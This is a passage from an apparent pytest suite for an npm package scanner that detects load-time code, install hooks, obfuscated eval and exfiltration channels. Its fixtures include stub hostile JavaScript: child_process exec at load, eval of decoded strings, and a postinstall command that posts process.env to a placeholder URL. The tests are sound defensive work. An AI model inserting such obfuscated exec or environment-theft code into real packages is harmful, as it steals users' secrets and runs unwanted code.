        # UMD: the factory handed to the wrapper runs.
        "(function (root, factory) { module.exports = factory() })(this, function () {\n"
        "  fetch('u') });\n",
    ],
)
def test_functions_that_run_at_load_are_read(make_npm, source):
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert ("BKT-NPM-IMPORT-001", "high", "package/index.js") in _code(findings)


@pytest.mark.parametrize(
    "source",
    [
        "function f() { require('https').get('u') }\nmodule.exports = f;\n",
        "exports.get = (u) => fetch(u);\n",
        "class Client { send() { fetch('u') } }\nmodule.exports = Client;\n",
        "module.exports = { send() { fetch('u') } };\n",
        "const get = memoize(() => fetch('u'));\n",  # wrapped, not called
        "emitter.on('ready', () => fetch('u'));\n",  # runs only when something happens
        # A parameter is not the module of the same name outside.
        "var e = require('http');\nfunction t(e) { return e.get(u) }\nt(other);\n",
    ],
)
def test_code_that_does_not_run_at_load_is_not_read(make_npm, source):
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert _code(findings) == []


@pytest.mark.parametrize(
    "source",
    [
        # esbuild: each module is a method of an object handed to __commonJS.
        "var require_net = __commonJS({\n"
        "  'src/net.js'(exports, module) { require('https').get('u'); }\n"
        "});\nmodule.exports = require_net();\n",
        # webpack 5: a table of module functions, run by __webpack_require__.
        "(() => { var __webpack_modules__ = ({\n"
        "  './src/net.js': ((module) => { fetch('u'); })\n"
        "}); __webpack_require__('./src/net.js'); })();\n",
        # webpack 4 and browserify: the modules are handed to the bootstrap.
        "(function (modules) { return modules[0](); })([function (module) { fetch('u'); }]);\n",
    ],
)
def test_bundled_modules_run_at_load(make_npm, source):
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert ("BKT-NPM-IMPORT-001", "high", "package/index.js") in _code(findings)


def test_the_finding_names_the_function_that_holds_the_code(make_npm):
    source = "function main() { helper() }\nfunction helper() { fetch('u') }\nmain();\n"
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    [finding] = [f for f in findings if f.rule_id == "BKT-NPM-IMPORT-001"]
    assert finding.message == "runs at load: calls fetch (in helper(), called at load)"


def test_functions_called_across_files_are_followed(make_npm):
    files = {
        "package/index.js": "const { start } = require('./lib/start');\nstart();\n",
        "package/lib/start.js": (
            "const https = require('https');\n"
            "function start() { https.get('https://example.com') }\n"
            "function stop() { require('child_process').exec('x') }\n"
            "module.exports = { start, stop };\n"
        ),
    }
    findings = scan_artifact(make_npm(files=files))
    assert _code(findings) == [("BKT-NPM-IMPORT-001", "high", "package/lib/start.js")]
    [finding] = [f for f in findings if f.rule_id == "BKT-NPM-IMPORT-001"]
    assert "in start(), called at load by package/index.js" in finding.message


@pytest.mark.parametrize(
    "files",
    [
        {  # ES modules: a named export
            "package/index.mjs": "import { start } from './lib.mjs';\nstart();\n",
            "package/lib.mjs": "export function start() { fetch('u') }\n",
        },
        {  # compiled TypeScript
            "package/index.mjs": 'const lib_1 = require("./lib");\n(0, lib_1.start)();\n',
            "package/lib.js": "exports.start = function () { fetch('u') };\n",
        },
        {  # a default export, through a re-export
            "package/index.mjs": "import start from './mid.mjs';\nstart();\n",
            "package/mid.mjs": "export * from './lib.mjs';\nexport { default } from './lib.mjs';\n",
            "package/lib.mjs": "export default function () { fetch('u') }\n",
        },
    ],
)
def test_module_shapes_across_files(make_npm, files):
    findings = scan_artifact(make_npm(_with(main="index.mjs"), files=files))
    assert [f[2] for f in _code(findings)] == [next(p for p in files if "/lib." in p)]


def test_a_file_read_as_install_code_is_not_read_again_at_load(make_npm):
    manifest = _with(scripts={"postinstall": "node index.js"})
    findings = scan_artifact(make_npm(manifest, files={"package/index.js": NETWORK}))
    assert _code(findings) == [("BKT-NPM-INSTALL-001", "high", "package/index.js")]


def test_bundled_dependencies_are_read_when_loaded(make_npm):
    files = {
        "package/index.js": "require('helper');\n",
        "package/node_modules/helper/package.json": '{"main": "main.js"}',
        "package/node_modules/helper/main.js": NETWORK,
    }
    findings = scan_artifact(make_npm(files=files))
    assert ("BKT-NPM-IMPORT-001", "high", "package/node_modules/helper/main.js") in _code(findings)


def test_a_file_loaded_whatever_its_extension_is_read_as_javascript(make_npm):
    # require runs a file with an unknown extension as JavaScript.
    files = {"package/index.js": "require('./data.txt');\n", "package/data.txt": NETWORK}
    findings = scan_artifact(make_npm(files=files))
    assert ("BKT-NPM-IMPORT-001", "high", "package/data.txt") in _code(findings)


# Step 6.3: hidden code.

BLOB = base64.b64encode(bytes(range(256)) * 3).decode()  # 1,024 characters, high entropy


@pytest.mark.parametrize(
    "source",
    [
        "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n",
        "eval(atob(s));\n",
        "new Function(String.fromCharCode(104, 105))();\n",
        "vm.runInThisContext(zlib.inflateSync(buf).toString());\n",
        "eval(s.split('').reverse().join(''));\n",
        "eval(s.map((c) => c ^ 42));\n",
        "const code = atob(s);\neval(code);\n",  # through a name bound once
        "eval('\\x72\\x65\\x71\\x75\\x69\\x72\\x65');\n",  # spelt with escapes
        "eval('eval')(s);\n",  # eval reached by its own name
        "(0, eval)(atob(s));\n",  # (0, eval) is eval: hidden when the code is
        "globalThis.eval(s);\n",  # eval reached through the global object
        "(0, globalThis.eval)(s);\n",
        "globalThis['ev' + 'al'](s);\n",  # a global by a name built at run time
        "global[atob('ZXZhbA==')](s);\n",
        "global['eval'](s);\n",
        "require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());\n",
        "require('child_' + 'process').exec('x');\n",  # a module name split up
        "function later() { eval(atob(s)) }\n",  # anywhere, not only what runs at load
    ],
)
def test_hidden_code_is_high(make_npm, source):
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert ("BKT-NPM-HIDE-001", "high", "package/index.js") in _code(findings)


@pytest.mark.parametrize(
    "source",
    [
        "const data = Buffer.from(input, 'base64');\n",
        "const g = (0, eval)('this');\n",
        "var root = Function('return this')();\n",
        "const value = global[name];\n",
        "eval(code);\n",  # exec, not hidden
        "const m = require('./' + 'lib');\n",
        # Found on the benign top 1,000, and fixed.
        "const process = require('process');\n",  # yaml, jest-util
        "var Symbol = globalThis['x'] || globalThis.Symbol;\n"
        "var now = globalThis[Symbol.for('jest-native-now')] || Date.now;\n",  # jest-circus
        "function Evaluate(...args) { return new globalThis.Function(...args); }\n",  # typebox
        # es-module-lexer, bundled in vite, tsx and @vitest/mocker: (0, eval)
        # is plain global eval, as compilers write it.
        "function i(A){try{return(0,eval)(A)}catch(A){}}\n",
        "var exists = globalThis[src_Symbol.for('jest-native-exists-file')];\n",  # jest-snapshot
    ],
)
def test_ordinary_code_is_not_hidden(make_npm, source):
    files = {"package/index.js": source, "package/lib.js": ""}
    findings = scan_artifact(make_npm(files=files))
    assert "BKT-NPM-HIDE-001" not in [rule for rule, _, _ in _code(findings)]


def test_comma_eval_at_load_is_exec_like_eval(make_npm):
    findings = scan_artifact(make_npm(files={"package/index.js": "(0, eval)(s);\n"}))
    rules = [rule for rule, _, _ in _code(findings)]
    assert "BKT-NPM-IMPORT-003" in rules
    assert "BKT-NPM-HIDE-001" not in rules


@pytest.mark.parametrize(
    ("source", "found"),
    [
        (f"const wasm = Buffer.from('{BLOB}', 'base64');\n", True),
        (f"const wasm = atob('{BLOB[:600]}' + '{BLOB[600:]}');\n", True),
        ("const x = Buffer.from('aGVsbG8=', 'base64');\n", False),  # short
        (f"const x = Buffer.from('{'ab' * 400}', 'base64');\n", False),  # low entropy
        (f"const x = Buffer.from('{BLOB}');\n", False),  # text, not decoded
    ],
)
def test_long_encoded_blob_into_a_decoder_is_low(make_npm, source, found):
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    hit = ("BKT-NPM-HIDE-002", "low", "package/index.js") in _code(findings)
    assert hit is found


# Step 6.4: shipped channels in JavaScript strings.


@pytest.mark.parametrize(
    ("path", "source", "rule"),
    [
        # In a function nothing calls: the channel is shipped all the same.
        ("index.js", f"function send(d) {{ return fetch('{HOOK}', d) }}\n", "BKT-EXFIL-001"),
        ("index.js", f"const t = `bot{BOT_TOKEN}`;\n", "BKT-EXFIL-002"),
        ("index.js", f"const h = '{base64.b64encode(HOOK.encode()).decode()}';\n", "BKT-EXFIL-001"),
        ("lib/x.js", f"exports.u = '{HOOK}';\n", "BKT-EXFIL-001"),  # a file the entry loads
    ],
)
def test_shipped_channels_in_javascript(make_npm, path, source, rule):
    files = {"package/index.js": "require('./lib/x');\n", f"package/{path}": source}
    findings = scan_artifact(make_npm(files=files))
    assert (rule, "medium", f"package/{path}") in _code(findings)
    assert all(HOOK not in f.message and BOT_TOKEN not in f.message for f in findings)


@pytest.mark.parametrize(
    "source",
    [
        "const invite = 'https://discord.gg/abc';\n",
        "const docs = '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11';\n",  # Telegram's docs example
        f"const parts = ['https://discord.com/api/webhooks/', '{'1' * 18}'];\n",  # not whole
    ],
)
def test_ordinary_links_in_javascript_are_not_channels(make_npm, source):
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert not [f for f in findings if f.rule_id.startswith("BKT-EXFIL")]


def test_channels_in_files_nothing_runs_are_not_read(make_npm):
    files = {"package/index.js": "module.exports = 1;\n", "package/cli.js": f"x = '{HOOK}';\n"}
    findings = scan_artifact(make_npm(_with(bin={"pkg": "cli.js"}), files=files))
    assert not [f for f in findings if f.rule_id.startswith("BKT-EXFIL")]


# Found in review: ways to run code at load that went unread.

EXEC = "require('child_process').exec('x')"


@pytest.mark.parametrize(
    "source",
    [
        f"class A {{ constructor() {{ {EXEC} }} }}\nnew A();\n",
        f"function f() {{ {EXEC} }}\nconst g = f;\ng();\n",
        f"function f() {{ {EXEC} }}\n(f)();\n",
        f"const o = {{ m() {{ {EXEC} }} }};\no.m();\n",
        f"(function () {{ {EXEC} }})``;\n",
        f"'a'.replace(/a/, function () {{ {EXEC} }});\n",
        f"document.addEventListener('DOMContentLoaded', () => {{ {EXEC} }});\n",
        # A regex after `of` must not open a fake comment over the next line.
        f"for (const x of /[/*]/.source) {{}}\n{EXEC};\n// */ ] ) {{}}\n",
        # Node 22 runs these as modules, where `<!--` is not a comment.
        f"const u = import.meta.url;\nlet a = 0, b = 1;\na <!--b; {EXEC}\n",
        f"await 0;\nlet a = 0, b = 1;\na <!--b; {EXEC}\n",
    ],
)
def test_more_ways_code_runs_at_load(make_npm, source):
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert ("BKT-NPM-IMPORT-002", "medium", "package/index.js") in _code(findings)


# Found in security review: code that runs, behind a clean verdict.


def test_main_follows_one_package_json_only(make_npm):
    # Node reads lib/index.js for main "lib", never lib/package.json's main.
    files = {
        "package/lib/package.json": '{"main": "ok.js"}',
        "package/lib/ok.js": "module.exports = 1;\n",
        "package/lib/index.js": f"{EXEC};\n",
    }
    findings = scan_artifact(make_npm(_with(main="lib"), files=files))
    assert ("BKT-NPM-IMPORT-002", "medium", "package/lib/index.js") in _code(findings)


@pytest.mark.parametrize(
    "first", ["const require = 1;", "let module = 1;", "class exports {}", "if (1) { await 0 }"]
)
def test_other_module_triggers_fail_closed_with_html_comments(make_npm, first):
    # Node 22 runs these as modules, where `<!--` is code; read as a script it hides a line.
    source = f"{first}\nvar y = 0;\nlet x = 1 <!--y; {EXEC}\n"
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert verdict(findings) != "clean"


@pytest.mark.parametrize(
    ("fields", "files"),
    [
        ({"prebuild": {"test": "t.js"}}, {"package/t.js": f"{EXEC};\n"}),
        ({}, {"package/prebuilds/linux-x64/x.node": b"\x7fELF"}),
        ({}, {"package/build/Release/x.node": b"\x7fELF"}),
    ],
)
def test_node_gyp_build_at_install_loads_package_code(make_npm, fields, files):
    # Unless building from source, it requires prebuild.test or loads the shipped addon.
    manifest = _with(scripts={"install": "node-gyp-build"}, **fields)
    findings = scan_artifact(make_npm(manifest, files=files))
    assert verdict(findings) != "clean"


def test_the_package_entry_is_read_whatever_its_extension(make_npm):
    manifest = _with(exports="./index.css")
    findings = scan_artifact(make_npm(manifest, files={"package/index.css": f"{EXEC};\n"}))
    assert ("BKT-NPM-IMPORT-002", "medium", "package/index.css") in _code(findings)


@pytest.mark.parametrize(
    "exports",
    [
        # Found on the benign top 1,000, and fixed.
        {".": {"style": "./index.css", "require": "./lib.js"}},  # tailwindcss: CSS tooling
        {".": {"@zod/source": "./src/index.ts", "require": "./lib.js"}},  # zod: TypeScript
        {"./lib/x.so.8": "./lib/x.so.8", ".": "./lib.js"},  # a library for a native addon
    ],
)
def test_exports_that_are_not_code_node_runs_are_not_read(make_npm, exports):
    files = {
        "package/lib.js": "module.exports = require('@scope/self/sub');\n",
        "package/index.css": "a { b: c }\n",
        "package/src/index.ts": "import { x } from './missing.js';\n",
        "package/lib/x.so.8": b"\x7fELF" + b"\x00" * 64,
    }
    manifest = {"name": "@scope/self", "version": "1.0.0", "exports": exports}
    findings = scan_artifact(make_npm(manifest, name="self-1.0.0.tgz", files=files))
    assert verdict(findings) == "clean"


def test_the_package_name_does_not_lead_to_type_declarations(make_npm):
    # @smithy/core: require of its own name, whose subpath has a types condition.
    exports = {".": "./lib.js", "./sub": {"types": "./sub.d.ts", "require": "./sub.js"}}
    files = {
        "package/lib.js": "require('@scope/self/sub');\n",
        "package/sub.js": "module.exports = 1;\n",
        "package/sub.d.ts": "export * from './missing';\n",
    }
    manifest = {"name": "@scope/self", "version": "1.0.0", "exports": exports}
    findings = scan_artifact(make_npm(manifest, name="self-1.0.0.tgz", files=files))
    assert findings == []


def test_file_names_are_matched_in_any_case(make_npm):
    # On a case-insensitive disk INDEX.JS is index.js; a later copy replaces an earlier one.
    findings = scan_artifact(make_npm(files={"package/INDEX.JS": f"{EXEC};\n"}))
    assert ("BKT-NPM-IMPORT-002", "medium", "package/INDEX.JS") in _code(findings)
    files = {"package/index.js": "module.exports = 1;\n", "package/INDEX.js": f"{EXEC};\n"}
    findings = scan_artifact(make_npm(files=files))
    assert verdict(findings) != "clean"


def test_a_native_addon_the_package_does_not_ship_is_not_verified(make_npm):
    source = "module.exports = require('./build/Release/addon.node');\n"
    manifest = _with(scripts={"install": "prebuild-install"})
    findings = scan_artifact(make_npm(manifest, files={"package/index.js": source}))
    assert verdict(findings) == "not_verified"


def test_inline_install_code_that_reads_the_environment_and_sends(make_npm):
    command = "node -e \"fetch('u', {method: 'POST', body: JSON.stringify(process.env)})\""
    findings = scan_artifact(make_npm(_with(scripts={"postinstall": command})))
    assert "BKT-NPM-INSTALL-008" in _rules(findings)


def test_an_assignment_at_the_end_of_a_file(make_npm):
    scan_artifact(make_npm(files={"package/index.js": "x ="}))  # does not raise


def test_a_name_bound_too_many_ways_is_not_verified(make_npm):
    source = "function f() {}\n" * 300 + "f();\n"
    findings = scan_artifact(make_npm(files={"package/index.js": source}))
    assert verdict(findings) == "not_verified"


@pytest.mark.parametrize(
    "scripts",
    [
        {f"s{n}": f"npm run s{n + 1}" for n in range(1200)} | {"install": "npm run s0"},
        {f"s{n}": f"npm run s{n + 1} && npm run s{n + 1}" for n in range(40)}
        | {"install": "npm run s0"},
    ],
)
def test_scripts_that_run_each_other_stay_cheap(make_npm, scripts):
    started = time.perf_counter()
    findings = scan_artifact(make_npm(_with(scripts=scripts)))
    assert time.perf_counter() - started < 5
    assert "BKT-NPM-SCRIPT-001" in _rules(findings)


@pytest.mark.parametrize(
    ("fields", "files"),
    [
        (
            {"exports": {"./*": "./*a*a*a*a*a*a*a*a*a*a*a*a*x.js"}},
            {f"package/{'a' * 40}.js": "1;\n"},
        ),
        ({}, {"package/index.js": "a=" * 20_000 + "1;\n"}),
        ({}, {"package/index.js": "f(" + "process.env," * 20_000 + "1);\n"}),
        ({}, {"package/index.js": "x=>" * 20_000 + "1;\n"}),
        ({}, {"package/index.js": "eval(" * 900 + "atob(x)" + ")" * 900 + ";\n"}),
    ],
)
def test_hostile_shapes_are_read_in_bounded_time(make_npm, fields, files):
    started = time.perf_counter()
    scan_artifact(make_npm(_with(**fields), files=files))
    assert time.perf_counter() - started < 5


@pytest.mark.parametrize(
    "filename, expected",
    [
        ("left-pad-1.3.0-beta.1.tgz", ("left-pad", "1.3.0-beta.1")),
        ("left-pad-1.3.0.tgz", ("left-pad", "1.3.0")),
        ("scope-pkg-2.0.0-rc.1+build.5.tgz", ("scope-pkg", "2.0.0-rc.1+build.5")),
        # a package named lodash-4.17.21 is not lodash
        ("lodash-4.17.21-1.0.0.tgz", ("lodash-4.17.21", "1.0.0")),
    ],
)
def test_npm_tarball_names_split_at_the_semver(filename, expected):
    from buckthorn.scan import split_artifact_name

    assert split_artifact_name(filename) == expected


def test_npm_allowlist_names_are_not_folded_like_pypi_names(make_npm, tmp_path):
    from buckthorn.cli import main

    manifest = {"name": "lodash.get", "version": "1.0.0", "scripts": {"install": "node x.js"}}
    tarball = make_npm(manifest, name="lodash.get-1.0.0.tgz")
    entry = {"rule": "BKT-NPM-SCRIPT-001", "package": "lodash-get", "reason": "r"}
    allow = tmp_path / "allow.json"
    allow.write_text(json.dumps({"allow": [entry]}))
    assert main(["scan", "--allowlist", str(allow), str(tarball)]) == 1
    entry["package"] = "lodash.get"
    allow.write_text(json.dumps({"allow": [entry]}))
    assert main(["scan", "--allowlist", str(allow), str(tarball)]) == 0
